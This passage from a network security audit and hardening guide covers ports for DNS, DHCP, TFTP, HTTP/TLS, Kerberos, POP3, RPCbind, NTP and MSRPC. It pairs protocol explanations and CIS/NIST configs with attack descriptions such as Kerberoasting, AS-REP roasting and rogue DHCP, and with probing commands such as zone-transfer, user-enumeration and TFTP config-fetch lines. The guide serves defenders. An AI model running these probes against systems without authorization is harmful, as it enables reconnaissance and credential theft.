    smtpd_relay_restrictions = permit_mynetworks, permit_sasl_authenticated, reject_unauth_destination
    smtpd_data_restrictions = reject_unauth_pipelining
    ```

---

### [PORT-05] Port 53/UDP, 53/TCP (853/TCP, 443/TCP) — Domain Name System (DNS)

* **Transport Protocol & IANA Assignment**:
  * `53/UDP`: Standard DNS queries and responses (up to 512 bytes classically, or up to `1232`–`4096` bytes with EDNS0 RFC 6891).
  * `53/TCP`: Zone transfers (`AXFR`/`IXFR`) and truncated responses where the `TC` (Truncated) flag bit is set in UDP.
  * `853/TCP`: DNS-over-TLS (DoT, RFC 7858).
  * `443/TCP` & `443/UDP`: DNS-over-HTTPS (DoH, RFC 8484) and DNS-over-QUIC (DoQ, RFC 9250).
* **RFC Specification**: RFC 1034 / RFC 1035 (Core DNS), RFC 4033–4035 (DNSSEC), RFC 5155 (NSEC3), RFC 6891 (EDNS0), RFC 8945 (TSIG Secret Key Transaction Authentication).
* **Architecture & Handshake Overview**:
  Every DNS message shares a unified 12-byte fixed header followed by four variable-length sections: `Question`, `Answer`, `Authority`, and `Additional`.
  ```
  +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
  |                      ID (16-bit)              |
  +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
  |QR|   Opcode  |AA|TC|RD|RA| Z|AD|CD|   RCODE   |
  +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
  |                    QDCOUNT                    |
  |                    ANCOUNT                    |
  |                    NSCOUNT                    |
  |                    ARCOUNT                    |
  +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
  ```
  1. **Recursive vs. Authoritative Resolution**: A stub resolver sends a query with `RD=1` (Recursion Desired) and a randomized 16-bit Transaction `ID` from a randomized ephemeral UDP source port to a recursive resolver. The recursive resolver iteratively queries the Root (`.`), TLD (`.lk`, `.com`), and Authoritative Name Servers (`AA=1` in response).
  2. **DNSSEC Validation**: Authoritative zones sign Resource Record Sets (RRsets) with a Zone Signing Key (`ZSK`), producing `RRSIG` records. The `ZSK` and Key Signing Key (`KSK`) are published as `DNSKEY` records, and a cryptographic hash of the `KSK` is anchored in the parent zone as a `DS` (Delegation Signer) record. Validating resolvers return `AD=1` (Authenticated Data).
* **Authorized Security Audit Checklist**:
  * **Unauthenticated Zone Transfer (`AXFR` / `IXFR`)**: Test every authoritative nameserver on `53/TCP` to ensure full zone dumps are restricted to authorized secondary servers and authenticated via TSIG (`HMAC-SHA256`).
  * **Open Recursive Resolver**: Verify that external authoritative DNS servers refuse recursive queries (`RA=0`, `RCODE=REFUSED`) from untrusted public IP addresses to prevent cache poisoning and **DNS Amplification DDoS** (where a 60-byte spoofed UDP `ANY` or `DNSKEY` query yields a 4,000-byte UDP response).
  * **DNSSEC & NSECZone Walking**: Check whether DNSSEC is enabled, whether `RRSIG` signatures are expired, and whether NSEC or NSEC3 (with opt-out/iterations) allows offline zone enumeration.
  * **Dynamic DNS Updates (RFC 2136)**: Test if unauthenticated `NSUPDATE` requests can inject rogue `A` or `TXT` records into internal Active Directory or BIND zones.
  * **Subdomain Takeover (Dangling CNAME / NS)**: Audit all `CNAME` and `NS` records pointing to deprovisioned cloud resources (S3 buckets, Azure App Services, GitHub Pages) or unregistered domains.
* **Diagnostic & Auditing Commands**:
  ```bash
  # 1. Test for Zone Transfer (AXFR) against a target nameserver over TCP/53
  dig @<nameserver-ip> <domain.tld> AXFR +tcp

  # 2. Verify whether a DNS server permits open recursion and Chaos version disclosure
  dig @<nameserver-ip> google.com A +recurse
  dig @<nameserver-ip> version.bind CH TXT +short

  # 3. Validate DNSSEC chain of trust and EDNS0 payload size
  dig @<nameserver-ip> <domain.tld> SOA +dnssec +multi

  # 4. Nmap comprehensive DNS audit (recursion, zone transfer, NSID, NSEC enumeration)
  nmap -sU -sT -p 53 --script dns-recursion,dns-zone-transfer,dns-nsid,dns-service-discovery \
    --script-args="dns-zone-transfer.domain=<domain.tld>" <target-ip>
  ```
* **Common Configuration Weaknesses**:
  * `allow-transfer { any; };` or missing `allow-transfer` directive in BIND9 `named.conf` (which defaults to allowing transfers to anyone in older configurations).
  * `recursion yes;` exposed to `0.0.0.0/0` without `allow-recursion` ACLs or Response Rate Limiting (`rate-limit`).
* **CIS Hardening & NIST SP 800-53 Controls**:
  * **BIND9 Hardening (`/etc/bind/named.conf.options`)**:
    ```hcl
    acl "trusted_internal" { 10.0.0.0/8; 127.0.0.1; };
    options {
        version "Not Disclosed";
        recursion no;                      // On authoritative servers
        allow-recursion { trusted_internal; }; // Only on internal resolvers
        allow-transfer { none; };          // Override per-zone with TSIG key
        dnssec-validation auto;
        edns-udp-size 1232;                // Prevent IP fragmentation (DNS Flag Day 2020)
        max-udp-size 1232;
        rate-limit {
            responses-per-second 10;
            window 5;
        };
    };
    ```
  * **NIST Mapping**: SC-20 (Secure Name/Address Resolution Service — Authoritative Source), SC-21 (Recursive or Caching Resolver).

---

### [PORT-06] Ports 67/UDP, 68/UDP (546/UDP, 547/UDP) — Dynamic Host Configuration Protocol (DHCP / DHCPv6)

* **Transport Protocol & IANA Assignment**:
  * `67/UDP`: DHCPv4 Server listening port.
  * `68/UDP`: DHCPv4 Client listening port.
  * `546/UDP` (Client) & `547/UDP` (Server): DHCPv6 (RFC 8415).
* **RFC Specification**: RFC 2131 (DHCPv4), RFC 2132 (DHCP Options and BOOTP Vendor Extensions), RFC 3046 (DHCP Relay Agent Information Option 82), RFC 8415 (DHCPv6).
* **Architecture & Handshake Overview**:
  DHCPv4 dynamically provisions IPv4 addresses, subnet masks, default gateways, and DNS resolvers using the four-step **DORA** broadcast state machine:
  1. **DHCPDISCOVER**: Client boots with source IP `0.0.0.0:68` and broadcasts to `255.255.255.255:67` (Layer 2 `ff:ff:ff:ff:ff:ff`) requesting an IP configuration.
  2. **DHCPOFFER**: Listening DHCP servers reserve an IP lease and reply (broadcast or unicast to `68/UDP`) offering an IP address (`yiaddr`), subnet mask (Option 1), router (Option 3), DNS server (Option 6), and lease time (Option 51).
  3. **DHCPREQUEST**: Client accepts the first arriving offer by broadcasting a `DHCPREQUEST` specifying the chosen Server Identifier (Option 54).
  4. **DHCPACK**: The selected server commits the lease and replies with `DHCPACK` containing full network options.
* **Authorized Security Audit Checklist**:
  * **Rogue DHCP & MITM Race Condition**: Check if Layer 2 switches allow untrusted access ports to send `DHCPOFFER`/`DHCPACK` frames. An attacker responding faster than the legitimate server can assign a rogue Default Gateway (Option 3) and rogue DNS Server (Option 6) or WPAD proxy URL (Option 252).
  * **DHCPv6 DNS Takeover (`mitm6` style)**: On networks where IPv6 is enabled by default on Windows endpoints even if only IPv4 is managed, test whether unauthenticated DHCPv6 `Advertise`/`Reply` packets on `546/UDP` can assign the attacker as the primary IPv6 DNS server.
  * **DHCP Starvation**: Verify whether switch port security (`sticky MAC`) and rate limiting prevent an attacker from exhausting the entire IPv4 scope with spoofed client hardware addresses (`chaddr`).
  * **Option 114 / Option 252 / Legacy Shellshock**: Inspect custom vendor options passed to clients.
* **Diagnostic & Auditing Commands**:
  ```bash
  # 1. Non-destructive broadcast DHCP discovery without claiming a lease (Nmap)
  sudo nmap -sU -p 67 --script broadcast-dhcp-discover <target-subnet-or-interface>

  # 2. Passive capture of DORA transactions and DHCP options via tcpdump
  sudo tcpdump -i eth0 -nnvvv port 67 or port 68 -c 10
  ```
* **Common Configuration Weaknesses**:
  * Absence of **DHCP Snooping** on enterprise access switches, treating all RJ45 wall jacks and Wi-Fi VLAN ports as trusted DHCP server ports.
  * Dual-stack Windows environments leaving IPv6 DHCP client enabled on `546/UDP` without RA Guard (Router Advertisement Guard) and DHCPv6 Guard.
* **CIS Hardening & NIST SP 800-53 Controls**:
  * **Cisco IOS-XE Switch DHCP Snooping & Dynamic ARP Inspection (DAI)**:
    ```ios
    ip dhcp snooping
    ip dhcp snooping vlan 10,20,30
    no ip dhcp snooping information option
    interface TenGigabitEthernet1/0/1
     description UPLINK_TO_CORE_DHCP_SERVER
     ip dhcp snooping trust
    interface range GigabitEthernet1/0/2 - 48
     ip dhcp snooping limit rate 15
    ip arp inspection vlan 10,20,30
    ```
  * **IPv6 First-Hop Security**: Enable `ipv6 nd raguard` and `ipv6 dhcp guard` on all untrusted Layer 2 access ports.

---

### [PORT-07] Port 69/UDP — Trivial File Transfer Protocol (TFTP)

* **Transport Protocol & IANA Assignment**: `69/UDP` (Initial request socket; subsequent data transfer uses ephemeral UDP ports negotiated via TIDs).
* **RFC Specification**: RFC 1350 (The TFTP Protocol Revision 2), RFC 2347 (TFTP Option Extension), RFC 2348 (Blocksize Option).
* **Architecture & Handshake Overview**:
  TFTP is a minimalist, lock-step UDP file transfer protocol designed to fit in tiny boot ROMs (PXE network boot, VoIP phones, router IOS recovery). It provides **zero built-in authentication, zero encryption, and zero directory listing (`ls`) capability**.
  1. **Connection Establishment**: Client sends a Read Request (`RRQ`, Opcode `1`) or Write Request (`WRQ`, Opcode `2`) containing the filename and transfer mode (`octet` or `netascii`) from a random client Transfer Identifier (TID, i.e., UDP source port) to `69/UDP`.
  2. **Lock-Step Data Blocks**: The server selects a new ephemeral UDP port as its server TID and sends `DATA` (Opcode `3`, Block `#1`, 512 bytes payload) directly to the client's TID. Each 512-byte block must be explicitly acknowledged by an `ACK` (Opcode `4`, Block `#N`) before block `#N+1` is transmitted. A `DATA` packet shorter than 512 bytes terminates the transfer.
* **Authorized Security Audit Checklist**:
  * Probe known configuration filenames on exposed `69/UDP` endpoints (e.g., `startup-config`, `running-config`, `SEP<MAC>.cnf.xml` for Cisco IP phones, `pxelinux.cfg/default` for PXE boot servers containing kickstart root password hashes).
  * Test whether `WRQ` (Opcode `2`) allows uploading files or overwriting configuration files.
* **Diagnostic & Auditing Commands**:
  ```bash
  # 1. Nmap TFTP enumeration using standard Cisco/PXE/VoIP filename wordlists
  sudo nmap -sU -p 69 --script tftp-enum <target-ip>

  # 2. Fetch PXE boot configuration via cURL TFTP support
  curl -s tftp://<target-ip>/pxelinux.cfg/default
  ```
* **Common Configuration Weaknesses**:
  * Leaving TFTP daemons (`tftpd-hpa`, `atftp`, SolarWinds TFTP) running permanently after a network firmware upgrade or exposing PXE boot VLANs to general user subnets.
  * Configuring `tftpd` with `--create` (`-c`), permitting unauthenticated arbitrary file uploads.
* **CIS Hardening & NIST SP 800-53 Controls**:
  * Disable `tftpd` completely (`systemctl disable --now tftpd-hpa`). Where PXE/VoIP provisioning is mandatory, migrate to **HTTPBoot over UEFI HTTPS** or isolate TFTP strictly within a dedicated provisioning VLAN with read-only permissions (`--secure` chroot to `/srv/tftp`, owned by `root:root` with mode `0555`).

---

### [PORT-08] Ports 80/TCP, 443/TCP, 443/UDP — Hypertext Transfer Protocol (HTTP/1.1, HTTP/2, HTTP/3 over TLS/QUIC)

* **Transport Protocol & IANA Assignment**:
  * `80/TCP`: Unencrypted HTTP/1.1 and HTTP/2 (`h2c`).
  * `443/TCP`: HTTPS (HTTP/1.1 and HTTP/2 `h2` over TLS 1.2/1.3).
  * `443/UDP`: HTTP/3 (`h3`) over QUIC (RFC 9000 / RFC 9114) with integrated TLS 1.3 key schedule.
* **RFC Specification**: RFC 9110 (HTTP Semantics), RFC 9112 (HTTP/1.1), RFC 9113 (HTTP/2), RFC 9114 (HTTP/3), RFC 8446 (TLS 1.3), RFC 6797 (HSTS).
* **Architecture & Handshake Overview**:
  1. **HTTP/1.1 vs. HTTP/2 vs. HTTP/3**:
     * **HTTP/1.1**: Text-based request/response delimited by `CRLF` (`\r\n`), using `Content-Length` or `Transfer-Encoding: chunked` to define message boundaries. Susceptible to Head-of-Line (HoL) blocking and HTTP Request Smuggling (`CL.TE` / `TE.CL` / `TE.TE`) when reverse proxies and backend origin servers parse framing headers inconsistently.
     * **HTTP/2 (`h2`)**: Negotiated during the TLS handshake via the **ALPN** (Application-Layer Protocol Negotiation) extension. Replaces text framing with binary frames (`HEADERS`, `DATA`, `SETTINGS`, `WINDOW_UPDATE`, `RST_STREAM`) multiplexed over a single TCP connection with `HPACK` header compression.
     * **HTTP/3 (`h3`)**: Runs over **QUIC** (`443/UDP`), combining transport and cryptographic handshakes into 1-RTT (or 0-RTT resumption), eliminating TCP-level Head-of-Line blocking across independent streams.
  2. **TLS 1.3 Handshake (RFC 8446)**:
     * Client sends `ClientHello` containing `supported_versions` (`0x0304`), `key_share` (ephemeral X25519 or P-256 public key), `signature_algorithms`, `server_name` (SNI), and `alpn` (`h2`, `http/1.1`).
     * Server responds in a single flight: `ServerHello` (selected `key_share`), `EncryptedExtensions`, `Certificate`, `CertificateVerify` (signature over handshake transcript), and `Finished` MAC. All handshake messages after `ServerHello` are encrypted using the ephemeral Diffie-Hellman shared secret, providing mandatory Forward Secrecy (PFS).
* **Authorized Security Audit Checklist**:
  * **Transport & TLS Posture**: Ensure port `80/TCP` returns an immediate `301 Moved Permanently` redirect to `https://` and that `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` is enforced on `443`. Verify TLS 1.0 and TLS 1.1 are disabled, only AEAD ciphers (`TLS_AES_256_GCM_SHA384`, `TLS_CHACHA20_POLY1305_SHA256`, `ECDHE-*-GCM`) are offered, and OCSP Stapling is active.
  * **HTTP Request Smuggling & HTTP/2 Downgrade (`H2.CL` / `H2.TE`)**: Audit reverse proxies (ALB, Nginx, HAProxy, Envoy) that terminate HTTP/2 on the frontend and rewrite requests to HTTP/1.1 on the backend. Verify if pseudo-headers or newline injections allow smuggling requests across shared backend keep-alive pools.
  * **HTTP/2 Rapid Reset (CVE-2023-44487) & CONTINUATION Flood**: Verify edge proxies enforce strict limits on concurrent streams and `RST_STREAM` frame rates.
  * **Security Response Headers**: Audit presence of `Content-Security-Policy` (CSP), `X-Content-Type-Options: nosniff`, `Referrer-Policy`, `Permissions-Policy`, and `Cross-Origin-Opener-Policy` (COOP).
* **Diagnostic & Auditing Commands**:
  ```bash
  # 1. Nmap TLS cipher enumeration, ALPN discovery, and HTTP security header audit
  nmap -sV -p 80,443 --script ssl-enum-ciphers,ssl-cert,http-security-headers,http-methods <target-ip>

  # 2. Inspect TLS 1.3 handshake, ALPN negotiation (h2), and OCSP stapling via OpenSSL
  openssl s_client -connect <target-domain>:443 -servername <target-domain> -alpn h2,http/1.1 -status -tls1_3

  # 3. Inspect HTTP/2 response headers, redirect chains, and timing metrics via cURL
  curl -ILs --http2 -w "\nDNS: %{time_namelookup}s | TLS: %{time_appconnect}s | TTFB: %{time_starttransfer}s\n" https://<target-domain>/
  ```
* **Common Configuration Weaknesses**:
  * Exposing `.git/config`, `.env`, `/server-status` (Apache `mod_status`), or `/nginx_status` on production virtual hosts.
  * Default virtual host catch-all behavior disclosing internal origin IP identity when queried directly by IP (bypassing Cloudflare/WAF via direct origin scan).
  * Missing `HttpOnly`, `Secure`, and `SameSite=Lax|Strict` attributes on session cookies.
* **CIS Hardening & NIST SP 800-53 Controls**:
  * **CIS Nginx Benchmark Hardening (`/etc/nginx/nginx.conf`)**:
    ```nginx
    server_tokens off;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers off;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305;
    ssl_session_tickets off;
    ssl_stapling on;
    ssl_stapling_verify on;
    http2_max_concurrent_streams 128;
    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-Frame-Options "DENY" always;
    add_header Content-Security-Policy "default-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self';" always;
    ```

---

### [PORT-09] Port 88/TCP, 88/UDP (464/TCP, 464/UDP) — Kerberos v5 Authentication Service

* **Transport Protocol & IANA Assignment**:
  * `88/TCP` & `88/UDP`: Kerberos v5 Key Distribution Center (KDC — Authentication Server `AS` and Ticket-Granting Server `TGS`). Microsoft Active Directory defaults to TCP when ticket size + PAC (Privilege Attribute Certificate) exceeds UDP MTU limits.
  * `464/TCP` & `464/UDP`: Kerberos password change / set protocol (`kpasswd`, RFC 3244).
* **RFC Specification**: RFC 4120 (The Kerberos Network Authentication Service v5), RFC 3962 (AES Encryption for Kerberos 5), RFC 4556 (PKINIT — Public Key Cryptography for Initial Authentication), RFC 6113 (FAST — Flexible Authentication Secure Tunneling / Kerberos Armoring).
* **Architecture & Handshake Overview**:
  Kerberos v5 is a stateful, ticket-based symmetric/asymmetric authentication protocol designed around a trusted third party (the KDC on Domain Controllers):
  1. **AS Exchange (`KRB_AS_REQ` -> `KRB_AS_REP`)**:
     * The client proves its identity by encrypting the current UTC timestamp (`PA-ENC-TIMESTAMP`) using a symmetric key derived from the user's password (AES-256-CTS-HMAC-SHA1-96 or legacy RC4-HMAC/NT Hash) or via X.509 Smartcard/Certificate (`PKINIT`).
     * The KDC verifies the timestamp (must be within a 5-minute clock skew window) and returns a **Ticket-Granting Ticket (TGT)** encrypted with the KDC's own `krbtgt` account secret key, alongside an encrypted session key for the client.
  2. **TGS Exchange (`KRB_TGS_REQ` -> `KRB_TGS_REP`)**:
     * To access a network service (identified by its Service Principal Name `SPN`, e.g., `MSSQLSvc/sql01.corp.local:1433` or `cifs/dc01.corp.local`), the client presents its TGT + an Authenticator to the KDC.
     * The KDC returns a **Service Ticket (ST)** encrypted with the target service account's long-term key (derived from the service account's AD password).
  3. **Application Exchange (`KRB_AP_REQ` -> `KRB_AP_REP`)**: The client presents the Service Ticket directly to the target server (e.g., over SMB `445` or HTTP `443` via SPNEGO), which decrypts it locally using its own key without contacting the KDC.
* **Authorized Security Audit Checklist**:
  * **AS-REP Roasting**: Identify user accounts with `UF_DONT_REQUIRE_PREAUTH` ("Do not require Kerberos preauthentication") set. For these accounts, the KDC responds to an unauthenticated `KRB_AS_REQ` with a `KRB_AS_REP` containing material encrypted with the user's password hash, enabling offline cracking.
  * **Kerberoasting**: Any authenticated domain user can request a `KRB_TGS_REQ` for any SPN in the domain. If the service runs under a user account with a weak password—especially if RC4-HMAC (`0x17`, `etype 23`) downgrade is allowed—the returned `KRB_TGS_REP` ticket can be cracked offline.
  * **Unconstrained, Constrained, and Resource-Based Constrained Delegation (RBCD)**: Audit `TRUSTED_FOR_DELEGATION`, `msDS-AllowedToDelegateTo` (`S4U2Self`/`S4U2Proxy`), and `msDS-AllowedToActOnBehalfOfOtherIdentity`.
  * **PKINIT / AD CS Shadow Credentials & Certifried (CVE-2022-26923)**: Check whether attackers with `GenericWrite` over a computer/user object can write to `msDS-KeyCredentialLink` and authenticate via `PKINIT` on `88/TCP` to recover the NTLM hash via `U2U` (User-to-User) tickets.
* **Diagnostic & Auditing Commands**:
  ```bash
  # 1. Nmap Kerberos realm and user/SPN enumeration check
  nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='CORP.LOCAL' <dc-ip>

  # 2. Request a valid TGT and inspect ticket encryption types (KVNO & Etype)
  kinit -V auditor@CORP.LOCAL && klist -ef

  # 3. PowerShell (Active Directory Module): Audit accounts vulnerable to AS-REP Roasting & Kerberoasting
  # Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
  # Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName,msDS-SupportedEncryptionTypes
  ```
* **Common Configuration Weaknesses**:
  * Supporting legacy `RC4_HMAC_MD5` (`etype 23`) encryption across domain trusts or service accounts instead of enforcing `AES256_CTS_HMAC_SHA1_96` (`etype 18`).
  * Running application SPNs under standard AD user accounts with non-expiring, human-chosen passwords instead of Group Managed Service Accounts (**gMSAs**) with 120-character auto-rotated passwords.
  * Failing to rotate the `krbtgt` account password twice (with a 24+ hour interval) regularly, allowing compromised `krbtgt` keys to forge **Golden Tickets** indefinitely.
* **CIS Hardening & NIST SP 800-53 Controls**:
  * **Active Directory Group Policy Hardening**:
    * *Network security: Configure encryption types allowed for Kerberos* -> Enable only `AES128_HMAC_SHA1`, `AES256_HMAC_SHA1`, and `Future encryption types`. Disable `DES` and `RC4_HMAC_MD5`.
    * Enable **Kerberos Armoring (FAST)** via Group Policy (`KDC support for claims, compound authentication and Kerberos armoring = Supported/Always provide claims`).
    * Place all Tier-0 privileged accounts into the **Protected Users** security group (enforces AES-only Kerberos, disables NTLM, reduces TGT lifetime to 4 hours, and disables delegation).
    * Migrate all service accounts with SPNs to **gMSA** (`New-ADServiceAccount`).

---

### [PORT-10] Ports 110/TCP, 995/TCP — Post Office Protocol v3 (POP3 / POP3S)

* **Transport Protocol & IANA Assignment**: `110/TCP` (POP3 with optional `STLS`), `995/TCP` (Implicit TLS POP3S, RFC 8314).
* **RFC Specification**: RFC 1939 (POP3), RFC 2449 (POP3 Extension Mechanism `CAPA`), RFC 2595 (`STLS` Extension), RFC 8314 (Cleartext Considered Obsolete: Use of TLS for Email Submission and Access).
* **Architecture & Handshake Overview**:
  POP3 is a simple pull-and-delete mailbox retrieval protocol with three states:
  1. **AUTHORIZATION State**: Server sends `+OK POP3 server ready`. Client queries capabilities via `CAPA`, optionally upgrades to TLS via `STLS`, and authenticates via `USER <name>` / `PASS <pass>`, `APOP` (MD5 challenge-response), or `AUTH <SASL-mechanism>` (e.g., `OAUTHBEARER`, `PLAIN`).
  2. **TRANSACTION State**: Once authenticated, the mailbox is locked and the client issues `STAT` (message count/size), `LIST`, `RETR <msg#>` (download), and `DELE <msg#>` (mark for deletion).
  3. **UPDATE State**: Client sends `QUIT`; the server expunges all messages marked with `DELE` and closes the TCP connection.
* **Authorized Security Audit Checklist**:
  * Verify if `USER`/`PASS` or `SASL PLAIN` is allowed on `110/TCP` without a preceding `STLS` upgrade (`disable_plaintext_auth = yes` in Dovecot).
  * Check whether `CAPA` advertises legacy `APOP` (vulnerable to MD5 collision challenge-recovery attacks) or leaks exact mail server patch levels in the `+OK` greeting banner.
* **Diagnostic & Auditing Commands**:
  ```bash
  # 1. Nmap POP3 capability enumeration and TLS cipher audit
  nmap -sV -p 110,995 --script pop3-capabilities,pop3-ntlm-info,ssl-enum-ciphers <target-ip>

  # 2. Test Implicit TLS on Port 995 and issue CAPA command
  openssl s_client -connect <target-ip>:995 -crlf -quiet
  ```
* **Common Configuration Weaknesses**:
  * Legacy POP3 services left enabled by default on Exchange or Dovecot installations when users exclusively use modern HTTPS/OAuth2 protocols.
* **CIS Hardening & NIST SP 800-53 Controls**:
  * Disable POP3 (`110/TCP`) and POP3S (`995/TCP`) unless explicitly required (`systemctl disable --now dovecot`). If required, disable port `110` entirely, enforce Implicit TLS 1.2/1.3 on `995/TCP` per RFC 8314, set `disable_plaintext_auth = yes`, and enforce OAuth2 (`OAUTHBEARER` / Modern Auth) instead of basic passwords.

---

### [PORT-11] Port 111/TCP, 111/UDP — ONC RPC Portmapper / RPCbind

* **Transport Protocol & IANA Assignment**: `111/TCP` & `111/UDP` (SUN Open Network Computing Remote Procedure Call `rpcbind` / `portmap`).
* **RFC Specification**: RFC 1833 (Binding Protocols for ONC RPC Version 2 — `portmap` v2 and `rpcbind` v3/v4), RFC 5531 (RPC: Remote Procedure Call Protocol Specification Version 2).
* **Architecture & Handshake Overview**:
  ONC RPC services (such as NFSv3, `mountd`, `nlockmgr`, `rquotad`, and NIS `ypbind`) do not always bind to fixed well-known TCP/UDP ports; instead, they bind to dynamic ports at startup and register their tuple—`(Program Number, Version Number, Protocol, Port)`—with the local `rpcbind` daemon on port `111`.
  1. **Lookup (`PMAPPROC_GETPORT` / `PMAPPROC_DUMP`)**: A client wanting to mount an NFSv3 export queries `111/TCP` or `111/UDP` asking for the port of RPC Program `100003` (`nfs`) and `100005` (`mountd`).
  2. **Direct RPC Call (`RPCBPROC_CALLIT`)**: `rpcbind` also supports an indirect call procedure (`CALLIT`) that forwards an RPC call directly to another registered local RPC program and relays the response, historically allowing attackers to bypass source-IP or port-based ACLs.
* **Authorized Security Audit Checklist**:
  * Query `rpcbind` (`PMAPPROC_DUMP`) to enumerate all active ONC RPC services (`nfs`, `mountd`, `status`, `nlockmgr`, `ypserv`, `rexd`, `sadmind`).
  * Test if `111/UDP` is exposed to the Internet, where it can be abused as a high-amplification UDP DDoS reflector (7x to 28x amplification factor).
* **Diagnostic & Auditing Commands**:
  ```bash
  # 1. Enumerate all registered RPC programs, versions, protocols, and ports
  rpcinfo -p <target-ip>

  # 2. Nmap RPC grinding andrpcinfo script execution
  nmap -sV -sT -sU -p 111 --script rpcinfo <target-ip>
  ```
* **Common Configuration Weaknesses**:
  * Binding `rpcbind` to `0.0.0.0:111` on Linux servers where NFSv4 (which runs purely on `2049/TCP` without needing `rpcbind`) or no NFS at all is used.
* **CIS Hardening & NIST SP 800-53 Controls**:
  * **Disable `rpcbind` (CIS Linux Benchmark 2.2.x)**:
    ```bash
    sudo systemctl stop rpcbind.socket rpcbind.service
    sudo systemctl mask rpcbind.socket rpcbind.service
    ```
  * Migrate all NFS deployments strictly to **NFSv4.1/v4.2** over `2049/TCP` with Kerberos (`sec=krb5p`), eliminating `rpcbind`, `mountd`, and `lockd`.

---

### [PORT-12] Port 123/UDP — Network Time Protocol (NTP)

* **Transport Protocol & IANA Assignment**: `123/UDP` (NTP time synchronization), `4460/TCP` (Network Time Security Key Establishment `NTS-KE`, RFC 8915).
* **RFC Specification**: RFC 5905 (Network Time Protocol Version 4: Protocol and Algorithms Specification), RFC 8915 (Network Time Security for the Network Time Protocol).
* **Architecture & Handshake Overview**:
  NTP synchronizes system clocks across a hierarchical tree of **Strata** (`Stratum 0`: atomic/GPS reference clocks -> `Stratum 1`: primary servers -> `Stratum 2..15`: secondary enterprise servers and endpoints).
  1. **Four-Timestamp Exchange**: Client sends Mode 3 (`Client`) packet with Origin Timestamp $T_1$. Server receives at $T_2$, transmits Mode 4 (`Server`) reply at $T_3$, and client receives at $T_4$.
  2. **Offset & Round-Trip Delay Calculation**:
     $$\text{Offset } \theta = \frac{(T_2 - T_1) + (T_3 - T_4)}{2}, \quad \text{Delay } \delta = (T_4 - T_1) - (T_3 - T_2)$$
  3. **Cryptographic Authentication**: Classic NTP supports symmetric key authentication (`SHA1`/`AES-CMAC` key IDs) and **NTS (RFC 8915)**, which uses TLS 1.3 on `4460/TCP` to negotiate AEAD cookies for subsequent `123/UDP` time packets.
* **Authorized Security Audit Checklist**:
  * **Mode 6 Control Queries (`readvar`)**: Test whether unauthenticated Mode 6 control messages (`ntpq -c rv`) leak OS architecture, kernel build version, NTP daemon version, IP addresses of internal peers, and system clock jitter.
  * **Mode 7 `REQ_MON_GETLIST_1` (`monlist`) DDoS Amplification**: Verify that legacy `ntpd` Mode 7 `monlist` is disabled (a 234-byte spoofed UDP packet can trigger up to 206x amplification returning the last 600 client IPs that queried the server).
  * **Time-Shifting Attacks**: Assess whether an unauthenticated MITM attacker on the LAN can spoof NTP responses to skew a server's clock, invalidating Kerberos TGT 5-minute windows, forcing TLS certificate expiration failures, or re-enabling expired X.509 certificates.
* **Diagnostic & Auditing Commands**:
  ```bash
  # 1. Nmap audit for NTP Mode 6 variables (ntp-info) and Mode 7 monlist vulnerability
  sudo nmap -sU -p 123 --script ntp-info,ntp-monlist <target-ip>

  # 2. Query remote NTP peer status and system variables via ntpq
  ntpq -c rv -c peers <target-ip>

  # 3. Verify local chrony time sources and NTS authentication status
  chronyc sources -v && chronyc authdata
  ```
* **Common Configuration Weaknesses**:
  * Missing `noquery` and `nomodify` in `/etc/ntp.conf` `restrict default` statements.
* **CIS Hardening & NIST SP 800-53 Controls**:
  * **Chrony Hardening (`/etc/chrony/chrony.conf` — CIS 2.1.1)**:
    ```ini
    server time.cloudflare.com iburst nts
    server ntppool1.time.nl iburst nts
    cmdport 0               # Disable UDP port 323 command listener
    port 0                  # On pure clients, disable listening on 123/UDP entirely
    ```
  * **Legacy `ntpd` Hardening (`/etc/ntp.conf`)**:
    ```ini
    disable monitor
    restrict -4 default kod notrap nomodify nopeer noquery limited
    restrict -6 default kod notrap nomodify nopeer noquery limited
    ```

---

### [PORT-13] Port 135/TCP, 135/UDP (Ephemeral 49152–65535/TCP) — Microsoft RPC Endpoint Mapper (MSRPC / DCOM)

* **Transport Protocol & IANA Assignment**: `135/TCP` & `135/UDP` (DCE/RPC Endpoint Mapper `epmapper` hosted by `svchost.exe -k RPCSS`), plus high ephemeral ports (`49152–65535/TCP` on Windows Vista/Server 2008+).
* **RFC Specification**: Open Group C706 (DCE 1.1: Remote Procedure Call), Microsoft `[MS-RPCE]` (Remote Procedure Call Protocol Extensions), `[MS-DCOM]` (Distributed Component Object Model).
* **Architecture & Handshake Overview**:
  MSRPC implements the OSF DCE/RPC model on Windows. Services identify themselves via a globally unique 128-bit **Interface UUID** and version (e.g., Task Scheduler `ATSVC`/`ITaskSchedulerService`, WMI `IWbemServices`, Distributed Transaction Coordinator, Certificate Services `ICertPassage`).
  1. **Endpoint Resolution (`ept_map`)**: A client connects to `135/TCP`, performs an `RPC Bind` to the Endpoint Mapper UUID (`e1af8308-5d1f-11c9-91a4-08002b14a0fa` v3.0), and requests the dynamic TCP port or named pipe where the desired Interface UUID is listening.
  2. **Dynamic RPC Connection & Auth**: The client opens a new TCP connection to the returned high ephemeral port (e.g., `49668/TCP`), sends an `RPC Bind` for the target Interface UUID with a negotiated **Authentication Level** (`RPC_C_AUTHN_LEVEL_NONE`, `CONNECT`, `CALL`, `PKT`, `PKT_INTEGRITY` [Signed], or `PKT_PRIVACY` [Encrypted via Kerberos/NTLMSSP]), and invokes remote methods (`Opnum`).
* **Authorized Security Audit Checklist**:
